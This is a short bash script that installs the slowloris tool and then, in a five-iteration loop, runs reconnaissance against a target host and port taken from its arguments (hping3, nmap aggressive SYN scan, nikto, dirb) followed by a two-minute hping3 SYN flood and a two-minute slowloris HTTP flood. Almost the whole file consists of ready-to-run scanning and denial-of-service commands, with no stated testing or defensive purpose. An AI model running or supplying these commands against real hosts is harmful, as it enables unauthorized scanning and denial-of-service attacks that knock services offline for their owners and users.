#!/bin/bash

#installing slowloris tools
rm -R /opt/slowloris/
git clone https://github.com/gkbrk/slowloris.git /opt/slowloris
n=0

while [ $n -lt 5 ];
do

        echo "Normal Ping"
        timeout 1m hping3 -S -p $2 $1

        echo "performing nmap scan"
        nmap -sS -A $1 -p $2

        echo "performing nikto scan"
        nikto -host 'http://'$1':'$2 -ask no



        echo "get directory list"
        dirb 'http://'$1':'$2


        echo "TCP Flood"
        timeout 2m hping3 -d 40000 -S -w 64 -p $2 --flood $1

        echo "HTTP Flood"
        timeout 2m python3 /opt/slowloris/slowloris.py 'http://'$1':'$2


        n=$(( $n+1 ))

done
